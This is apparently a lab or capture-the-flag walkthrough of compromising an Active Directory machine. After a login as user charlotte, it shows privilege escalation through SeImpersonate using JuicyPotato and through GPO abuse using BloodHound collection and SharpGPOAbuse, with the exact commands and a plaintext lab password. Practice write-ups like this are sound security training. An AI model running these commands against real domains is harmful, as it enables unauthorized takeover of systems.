## Enumeration
nmap show that the machine is AD
![[Pasted image 20260627143620.png]]

since we got the credentials of charlotte, try to login

## Foothold
Here's we success login as charlotte and got the user flag
![[Pasted image 20260627143847.png]]

## Privilege Escalation
After finish the chall, there's two way to privilege escalation

### SetImpersonate
charlotte user got seImpersonatePrivilege permission
![[Pasted image 20260627144620.png]]

Failed to use GodPotato and SigmaPotato
![[Pasted image 20260627150745.png]]
![[Pasted image 20260627150758.png]]

Using JuicyPotato that running program as system not running command as system
`.\JuicyPotato.exe -p payloads.exe -l 1449 -t *`
AND GOT AUTHORITY\SYSTEM
![[Pasted image 20260627151322.png]]

### Abusing GPO
Since VM01 is AD, try to dump bloodhound using credential we got
`bloodhound-ce-python  -u 'charlotte' -p 'Game2On4.!' -ns 192.168.222.97 -d secura.yzx -c All --zip`

![[Pasted image 20260627151556.png]]

On enumerating user charlotte, she has permission to WriteDacl, WriteOwner, and GeneriWrite
![[Pasted image 20260627151756.png]]

Using SharpGPOAbuse.exe to add charlotte as Local Admin
`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "DEFAULT DOMAIN POLICY"`
![[Pasted image 20260627152407.png]]

WAITING FOR SEVERAL MINUTES AND RELOGIN as charlotte (or gpupdate /force)
![[Pasted image 20260627152800.png]]






![[Pasted image 20260627073745.png]]
